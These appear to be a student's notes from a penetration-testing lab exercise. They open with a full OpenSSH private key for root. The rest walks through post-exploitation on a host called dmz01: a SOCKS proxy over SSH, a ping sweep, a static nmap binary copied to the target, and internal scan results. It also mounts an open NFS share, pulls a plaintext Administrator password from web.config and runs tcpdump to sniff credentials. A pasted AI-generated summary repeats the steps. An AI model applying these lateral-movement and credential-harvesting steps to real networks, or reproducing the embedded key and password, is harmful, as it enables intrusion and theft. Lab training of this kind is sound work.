-----BEGIN OPENSSH PRIVATE KEY-----
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
WNfJbbEPrmQf0AAAALcm9vdEB1YnVudHU=
-----END OPENSSH PRIVATE KEY-----



now that were in with root we can set up pivots and other lateral movements 


https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap   -> fucking use this cause proxychains bullshit fucking nmap never fucking works. 
** also always just use socks5 for proxychains.conf ** 

scp -i rootkey nmap root@10.129.229.147:/root

for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from

scp -i rootkey IL_hosts root@10.129.229.147:/root
IL_hosts  



1. ssh -D 9050 -i rootkey root@10.129.229.147 
2. for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from
3. after transfering binary nmap and IL_hosts ( just file with findings from the ping one liner above) 
4. ./nmap -sT -iL IL_hosts 
Nmap scan report for 172.16.8.3
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.50s latency).
Not shown: 1173 closed ports
PORT    STATE SERVICE
53/tcp  open  domain
88/tcp  open  kerberos
135/tcp open  epmap
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds
464/tcp open  kpasswd
593/tcp open  unknown
636/tcp open  ldaps
MAC Address: 00:50:56:B0:8D:DF (Unknown)

Nmap scan report for 172.16.8.20
Host is up (0.20s latency).
Not shown: 1175 closed ports
PORT     STATE SERVICE
80/tcp   open  http
111/tcp  open  sunrpc
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
3389/tcp open  ms-wbt-server
MAC Address: 00:50:56:B0:C9:EC (Unknown)

Nmap scan report for 172.16.8.50
Host is up (0.23s latency).
Not shown: 1177 closed ports
PORT     STATE SERVICE
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http-alt
MAC Address: 00:50:56:B0:D8:37 (Unknown)

Nmap scan report for 172.16.8.120
Host is up (0.00023s latency).
Not shown: 1171 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
110/tcp  open  pop3
111/tcp  open  sunrpc
143/tcp  open  imap2
993/tcp  open  imaps
995/tcp  open  pop3s
8080/tcp open  http-alt

5. we can assume 172.16.8.3 is DC since it has LDAP and kerberos on there 
6. after running proxychains enum4linux-ng on the DC nothing came up 
7. ON HOST MACHINE -> proxychains showmount -e 172.16.8.20
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.8.20:111  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.8.20:2049  ...  OK
Export list for 172.16.8.20:
/DEV01 (everyone)

 8. so we know DEV01 is the mnt point 
9. back on root ssh session -> root@dmz01:~# cd /tmp
root@dmz01:/tmp# mkdir DEV01
root@dmz01:/tmp# mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
root@dmz01:/tmp# cd DEV01/
root@dmz01:/tmp/DEV01# ls
BuildPackages.bat  CKEditorDefaultSettings.xml  CKToolbarButtons.xml  CKToolbarSets.xml  DNN  flag.txt  WatchersNET.CKEditor.sln
root@dmz01:/tmp/DEV01# cat flag.txt
bf22a1d0acfca4af517e1417a80e92d1

10. we have flag but lets continue to enumerate 
11. cd DNN
12. root@dmz01:/tmp/DEV01/DNN# cat web.config
<?xml version="1.0"?>
<configuration>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.6.2" />
      </system.Web>
  -->
  <username>Administrator</username>
  <password>
	<value>D0tn31Nuk3R0ck$$@123</value>

13. new creds -> Administrator:D0tn31Nuk3R0ck$$@123

14. Before we move on, since we have root access on dmz01 via SSH, we can run tcpdump as it's on the system. It can never hurt to "listen on the wire" whenever possible during a pentest and see if we can grab any cleartext credentials or generally uncover any additional information that may be useful for us. We'll typically do this during an Internal Penetration Test when we have our own physical laptop or a VM that we control inside the client's network. Some testers will run a packet capture the entire time (rarely, clients will even request this), while others will run it periodically during the first day or so to see if they can capture anything.
15. root@dmz01:/tmp# tcpdump -i ens192 -s 65535 -w ilfreight_pcap

tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 65535 bytes
^C2027 packets captured
2033 packets received by filter
0 packets dropped by kernel


GPT Breakdown: 

🕵️‍♂️ Internal Enumeration & Pivot Setup – dmz01
🎯 Goal:
Leverage root access on dmz01 to pivot into the internal network

Identify accessible internal systems

Retrieve credentials and flags

Begin setting up for lateral movement

🔑 Root Access Recap:
We previously gained root SSH access to dmz01 using a dumped private key:

bash
Copy
Edit
chmod 600 rootkey
ssh -i rootkey root@10.129.229.147
🌐 Proxy Setup for Pivot:
We set up a dynamic SOCKS5 proxy to route traffic through dmz01:

bash
Copy
Edit
ssh -D 9050 -i rootkey root@10.129.229.147
Proxychains tip: Always use socks5 in /etc/proxychains.conf.

🔍 Host Discovery in 172.16.8.0/24:
bash
Copy
Edit
for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from
Save the responding IPs to IL_hosts.

🚀 Bypassing Nmap Proxy Issues:
Proxychains often breaks with nmap, so we used a static binary:

Download from: Andrew-D Static Binaries

Transfer it to the target:

bash
Copy
Edit
scp -i rootkey nmap root@10.129.229.147:/root
Then scan the internal targets from dmz01:

bash
Copy
Edit
./nmap -sT -iL IL_hosts
🔎 Key Hosts Discovered:
🧠 Likely Domain Controller – 172.16.8.3
makefile
Copy
Edit
Ports: 53, 88, 135, 139, 389, 445, 464, 593, 636
💾 Fileshare/Dev System – 172.16.8.20
yaml
Copy
Edit
Ports: 80, 111, 135, 139, 445, 2049 (NFS), 3389
🌐 Web System – 172.16.8.50
yaml
Copy
Edit
Ports: 135, 139, 445, 3389, 8080
💻 Mail/Web – 172.16.8.120
yaml
Copy
Edit
Ports: 21, 22, 25, 53, 80, 110, 111, 143, 993, 995, 8080
📁 NFS Enumeration & Flag Retrieval:
Enumerated exported shares via host machine:

bash
Copy
Edit
proxychains showmount -e 172.16.8.20
# Output: /DEV01 (everyone)
On dmz01, mounted the share:

bash
Copy
Edit
mkdir /tmp/DEV01
mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
cd /tmp/DEV01
Retrieved flag:

bash
Copy
Edit
cat flag.txt
# Flag: bf22a1d0acfca4af517e1417a80e92d1
🔐 Discovered Credentials:
Within /tmp/DEV01/DNN/web.config:

xml
Copy
Edit
<username>Administrator</username>
<value>D0tn31Nuk3R0ck$$@123</value>
Credentials Found: Administrator:D0tn31Nuk3R0ck$$@123

🕵️‍♂️ Passive Network Monitoring:
Captured internal traffic using:

bash
Copy
Edit
tcpdump -i ens192 -s 65535 -w ilfreight_pcap
Captured 2027 packets. Useful for sniffing plaintext creds or gathering internal service insights.

🔁 Notes:
Enum4linux-ng against the DC (172.16.8.3) returned no results

Proxychains + showmount worked great for NFS enum

Mounted share was world-readable – poor misconfiguration

